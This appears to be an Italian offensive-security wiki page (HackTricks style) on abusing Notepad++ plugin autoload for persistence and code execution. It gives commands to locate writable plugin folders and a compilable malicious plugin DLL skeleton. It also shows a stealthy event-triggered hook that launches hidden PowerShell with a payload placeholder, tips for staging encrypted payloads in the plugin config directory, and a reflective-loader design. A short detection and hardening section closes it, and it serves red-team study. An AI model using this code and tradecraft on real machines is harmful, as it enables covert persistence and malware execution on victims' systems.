# Persistenza ed esecuzione tramite autoload dei plugin di Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ esegue automaticamente il **autoload di ogni plugin DLL trovato nelle sue sottocartelle `plugins`** all'avvio. Inserire un plugin malevolo in una **installazione di Notepad++ scrivibile** consente la code execution all'interno di `notepad++.exe` ogni volta che l'editor viene avviato; ciò può essere sfruttato per la **persistence**, l'**initial execution** furtiva o come **in-process loader** se l'editor viene avviato con privilegi elevati.<sup>[[1]](#references)</sup>

Da **Notepad++ 7.6+**, il layout previsto per l'installazione manuale è **una sottocartella per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presenza di `doLocalConf.xml` accanto a `notepad++.exe`), l'intero application tree rimane locale a quella directory, trasformando spesso i bundle di strumenti copiati o amministrativi in una facile execution surface scrivibile dall'utente.<sup>[[2]](#references)</sup>

## Posizioni dei plugin scrivibili

- Installazione standard: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (di solito richiede privilegi di amministratore per la scrittura).<sup>[[1]](#references)</sup>
- Opzioni scrivibili per operatori con privilegi ridotti:<sup>[[1]](#references)</sup>
- Utilizzare la **portable build di Notepad++** in una cartella scrivibile dall'utente.
- Copiare `C:\Program Files\Notepad++` in un percorso controllato dall'utente (ad esempio `%LOCALAPPDATA%\npp\`) ed eseguire `notepad++.exe` da lì.
- Cercare **bundle di strumenti amministrativi**, copie di archivi zip estratti o toolkit di help desk che contengano già `doLocalConf.xml` e si trovino al di fuori di `Program Files`.
- Ogni plugin ha una propria sottocartella all'interno di `plugins` e viene caricato automaticamente all'avvio; le voci di menu compaiono sotto **Plugins**.<sup>[[2]](#references)</sup>

Triage rapido:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Punti di caricamento del plugin (primitive di esecuzione)
Notepad++ si aspetta specifiche **funzioni esportate**. Vengono tutte chiamate durante l'inizializzazione, fornendo molteplici superfici di esecuzione:<sup>[[1]](#references)</sup>
- **`DllMain`** — viene eseguita immediatamente al caricamento della DLL (primo punto di esecuzione).
- **`setInfo(NppData)`** — viene chiamata una volta al caricamento per fornire gli handle di Notepad++; è il luogo tipico per registrare le voci di menu.
- **`getName()`** — restituisce il nome del plugin mostrato nel menu.
- **`getFuncsArray(int *nbF)`** — restituisce i comandi del menu; anche se vuota, viene chiamata durante l'avvio.
- **`beNotified(SCNotification*)`** — riceve gli eventi di Notepad++ / Scintilla (utile per rimandare i payload fino a un'azione dell'utente o a un evento dell'editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestore dei messaggi, utile per scambi di dati più grandi.
- **`isUnicode()`** — flag di compatibilità verificato al caricamento.

La maggior parte delle funzioni esportate può essere implementata come **stub**; l'esecuzione può avvenire da `DllMain` o da uno qualsiasi dei callback precedenti durante l'autoload.

## Scheletro minimo di un plugin malevolo
Compilare una DLL con le esportazioni previste e posizionarla in `plugins\\MyNewPlugin\\MyNewPlugin.dll`, all'interno di una cartella di Notepad++ scrivibile:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compila la DLL (Visual Studio/MinGW).
2. Crea la sottocartella del plugin sotto `plugins` e inserisci la DLL al suo interno.
3. Riavvia Notepad++; la DLL viene caricata automaticamente, eseguendo `DllMain` e i callback successivi.

## Pattern di trigger a basso rumore tramite `beNotified`
Per l'OPSEC, molti payload **non** dovrebbero essere attivati da `DllMain`. Un pattern più discreto consiste nel consentire il caricamento pulito del plugin, per poi eseguire il codice solo dopo un evento realistico dell'editor, come **completamento dell'avvio**, **attivazione del buffer** o **primo carattere digitato**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Questo corrisponde meglio alla ricerca offensiva pubblica rispetto a un beacon rumoroso in `DllMain`: la DLL viene comunque caricata automaticamente all'avvio, ma l'azione malevola viene ritardata finché Notepad++ non risulta effettivamente in uso.

## Utilizzo della directory di configurazione dei plugin come storage secondario
Notepad++ espone `NPPM_GETPLUGINSCONFIGDIR`, che restituisce la **directory di configurazione dei plugin dell'utente corrente**.<sup>[[3]](#references)</sup> Un plugin malevolo può usarla per mantenere minima la DLL su disco, memorizzando al contempo configurazioni cifrate, payload staged o file di tasking in un percorso che si confonde con il normale stato dei plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operativamente, questo è utile quando vuoi:
- una piccola DLL bootstrap caricata automaticamente;
- tasking per utente senza dover modificare nuovamente il binario principale del plugin;
- separare il **trigger di autoload** dal secondo stadio più pesante.

## Reflective loader plugin pattern
Un plugin weaponized può trasformare Notepad++ in un **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Presentare una voce minima nell'interfaccia/menu (ad esempio, "LoadDLL").
- Accettare un **percorso file** o un **URL** da cui recuperare una DLL payload.
- Mappare riflessivamente la DLL nel processo corrente e invocare un entry point esportato (ad esempio, una funzione loader all'interno della DLL recuperata).
- Vantaggio: riutilizzare un processo GUI dall'aspetto benigno invece di avviare un nuovo loader; il payload eredita l'integrità di `notepad++.exe` (inclusi i contesti elevati).
- Compromessi: scrivere su disco una **DLL di plugin non firmata** è rumoroso; una variante pratica consiste nell'usare il plugin caricato automaticamente solo come stub e conservare il vero implant, cifrato e sottoposto a staging, altrove.

## Note su detection e hardening
- Bloccare o monitorare le **scritture nelle directory dei plugin di Notepad++** (incluse le copie portable nei profili utente); abilitare controlled folder access o l'application allowlisting.
- Generare alert per **nuove DLL non firmate** all'interno di `plugins`, modifiche agli alberi portable di Notepad++ e **child process/attività di rete insoliti** provenienti da `notepad++.exe`.
- Creare una baseline dei plugin legittimi e analizzare qualsiasi nuova DLL che esporti la normale interfaccia dei plugin di Notepad++ ma avvii anche shell, PowerShell o network beacon.
- Imporre l'installazione dei plugin esclusivamente tramite **Plugins Admin** e limitare l'esecuzione delle copie portable da percorsi non attendibili.

## Riferimenti

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
